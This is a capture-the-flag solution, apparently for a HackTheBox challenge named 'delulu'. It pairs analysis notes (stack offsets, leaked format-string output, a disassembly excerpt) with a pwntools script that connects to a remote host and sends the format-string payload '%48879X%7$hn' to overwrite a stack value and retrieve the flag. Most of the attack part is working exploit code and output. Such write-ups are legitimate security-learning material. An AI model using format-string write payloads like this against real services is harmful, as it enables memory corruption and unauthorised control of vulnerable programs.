#RazviOverflow
'''
read writes 0x1f (31) bytes from stack-0x38
Input is written @ stack-0x38 (rbp-0x30)
Value to overwrite is @ stack-0x48 (rbp-0x40)

>> ABCD.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X

[!] Checking.. ABCD.386930F0.0.47F14887.10.7FFFFFFF.1337BABE.38695210.44434241.252E5825
[-] ALERT ALERT ALERT ALERT

>> ABCD.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX

[!] Checking.. ABCD.7FFE9B8CEBB0.0.7FBB39514887.10.7FFFFFFF.1337BABE.
[-] ALERT ALERT ALERT ALERT

The address of the variable to overwrite is loaded in var_40h
0x00001465      48c745c0beba3713       mov     qword [var_48h], 0x1337babe ; moves data from src to dst
0x0000146d      488d45c0               lea     rax, [var_48h] ; load effective address
0x00001471      488945c8               mov     qword [var_40h], rax ; moves data from src to dst <---- HERE

The variable is at the 6th position from the beginning of the format string. (%6$X)
The address of the variable to overwrite is at the 7th position. (%7$X)
the input is at the 8th position from the beginning of the format string.

Bytes to write = Desired value - bytes written so far
beef = beef - 0
48879= 48879 - 0
'''

from pwn import *

context.binary = binary = "./delulu"

#p = process()
p = remote("83.136.253.78", 50119)
#pid = util.proc.pidof(p)[0]
#print(f"Pid is: {pid}")
#util.proc.wait_for_debugger(pid)

'''
Original value 0x1337babe. Program expects 0x1337beef.
beef = 48879. Since nothing else is printed before,
use %hn to write only 2 bytes with %48879X as padding.
The address to overwrite is conveniently loaded into %7$th position.
'''
payload = "%48879X%7$hn"
p.sendline(payload)
print(p.recvall())

# Flag = HTB{m45t3r_0f_d3c3pt10n}
